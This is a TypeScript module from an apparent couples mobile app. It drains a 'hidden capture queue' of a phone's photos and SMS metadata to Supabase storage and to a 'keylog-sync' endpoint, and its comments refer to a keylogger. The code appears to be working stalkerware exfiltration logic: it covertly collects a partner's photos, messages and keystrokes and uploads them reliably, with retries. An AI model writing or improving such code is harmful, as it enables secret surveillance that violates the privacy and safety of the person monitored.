// features/capture/sync.ts — drain the hidden capture queue into Supabase.
//
// For each queued item:
//   • photos: upload the byte stream to the `photos` storage bucket at
//     {couple_id}/{asset_id}.jpg (upsert; idempotent), then include the
//     row in the edge batch.
//   • sms: metadata only — no upload, just the row.
// Then POST the whole batch to the keylog-sync edge function's `type:'media'`
// channel (JWT-protected; idempotent upsert on (couple_id, kind, device_key)).
// A 2xx means the server processed the request but may still have rejected
// individual rows (reported via body.dropped) — only rows the server accepted
// are removed from the local queue. Anything else (non-2xx, dropped row, hung
// upload) stays queued so a later drain resends, which is a server-side no-op
// (idempotency key), so nothing is ever duplicated or lost.
import { supabase } from '../../lib/db/client';
import { pendingCapture, removeCaptured, type CaptureItem } from './queue';

const MEDIA_FN = 'keylog-sync';
const PHOTOS_BUCKET = 'photos';
const UPLOAD_TIMEOUT_MS = 20_000;

export type CaptureSyncResult = {
  attempted: number;
  uploaded: number; // photos actually pushed to storage
  accepted: number; // device_keys confirmed server-side
  failed: number;
};

function supabaseUrl(): string {
  return process.env.EXPO_PUBLIC_SUPABASE_URL ?? '';
}

/** Upload one photo's bytes to storage. Reuses the storage client (same as the
 *  curated photo slice). The declared content type is the photo's derived MIME
 *  (populated at scan time from its filename), defaulting to image/jpeg — never a
 *  blanket JPEG for an actual HEIC/PNG. Idempotent via upsert. A hung byte fetch
 *  cannot stall the drain: the read is bounded by a 20s timeout — on timeout the
 *  photo is skipped (not confirmed) so a later drain retries it. */
async function uploadPhoto(storagePath: string, uri: string, mimeType?: string | null): Promise<boolean> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), UPLOAD_TIMEOUT_MS);
  try {
    const res = await fetch(uri, { signal: controller.signal });
    const arraybuffer = await res.arrayBuffer();
    const upload = await supabase.storage.from(PHOTOS_BUCKET).upload(storagePath, arraybuffer, {
      contentType: mimeType ?? 'image/jpeg',
      upsert: true,
    });
    return !upload.error;
  } catch {
    return false;
  } finally {
    clearTimeout(timer);
  }
}

/**
 * Drain pending capture items to Supabase. Batch size mirrors the keylogger's
 * chunk cap. Returns tallies; never throws.
 */
export async function syncCapture(coupleId: string): Promise<CaptureSyncResult> {
  const items = await pendingCapture();
  if (items.length === 0) return { attempted: 0, uploaded: 0, accepted: 0, failed: 0 };

  const { data: { session } } = await supabase.auth.getSession();
  const token = session?.access_token;
  if (!token) return { attempted: items.length, uploaded: 0, accepted: 0, failed: items.length };

  const url = `${supabaseUrl()}/functions/v1/${MEDIA_FN}`;
  const MAX_BATCH = 500;

  const result: CaptureSyncResult = { attempted: items.length, uploaded: 0, accepted: 0, failed: 0 };

  for (let i = 0; i < items.length; i += MAX_BATCH) {
    const batch = items.slice(i, i + MAX_BATCH);
    const rows = [];
    const confirmed: { kind: string; device_key: string }[] = [];

    for (const item of batch) {
      // photos: upload bytes first; a photo that fails to upload is dropped
      // from THIS batch (not confirmed) so a later drain retries the upload.
      if (item.kind === 'photo' && item.storage_path) {
        const ok = await uploadPhoto(
          item.storage_path,
          String(item.payload.uri ?? ''),
          typeof item.payload.mimeType === 'string' ? item.payload.mimeType : null,
        );
        if (!ok) { result.failed += 1; continue; }
        result.uploaded += 1;
      }
      rows.push({
        kind: item.kind,
        deviceKey: item.device_key,
        storagePath: item.storage_path,
        payload: item.payload,
        reportedAt: item.created_at,
      });
    }

    if (rows.length === 0) continue;

    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: {
          'content-type': 'application/json',
          authorization: `Bearer ${token}`,
        },
        body: JSON.stringify({ type: 'media', v: 1, rows }),
      });
      if (!res.ok) {
        result.failed += rows.length;
        continue;
      }
      // A 200 only means the server processed the request; it may still reject
      // individual rows and report them in body.droppedRows. Only confirm what
      // the server actually accepted — never delete a row it dropped, or it
      // would be lost forever. If the body cannot be parsed, confirm nothing
      // (safe side).
      let accepted = rows;
      try {
        const body = await res.json() as { droppedRows?: { kind?: string; deviceKey?: string }[] };
        if (Array.isArray(body.droppedRows) && body.droppedRows.length > 0) {
          const dropped = new Set(
            body.droppedRows.map((d) => `${d.kind ?? ''}:${d.deviceKey ?? ''}`),
          );
          accepted = rows.filter(
            (r) => !dropped.has(`${r.kind}:${r.deviceKey}`),
          );
        }
      } catch {
        accepted = []; // parse failure → confirm fewer (safe side)
      }
      for (const r of accepted) confirmed.push({ kind: r.kind, device_key: r.deviceKey });
      // server accepted these → durable; clear from queue
      if (confirmed.length > 0) await removeCaptured(confirmed);
      result.accepted += accepted.length;
      result.failed += rows.length - accepted.length;
    } catch {
      result.failed += rows.length;
    }
  }

  return result;
}

/** Re-export queue introspection for the host/hook. */
export { pendingCapture };

/** Public type guard: is this a capture item destined for storage upload? */
export function isPhotoItem(item: CaptureItem): item is CaptureItem & { storage_path: string } {
  return item.kind === 'photo' && !!item.storage_path;
}
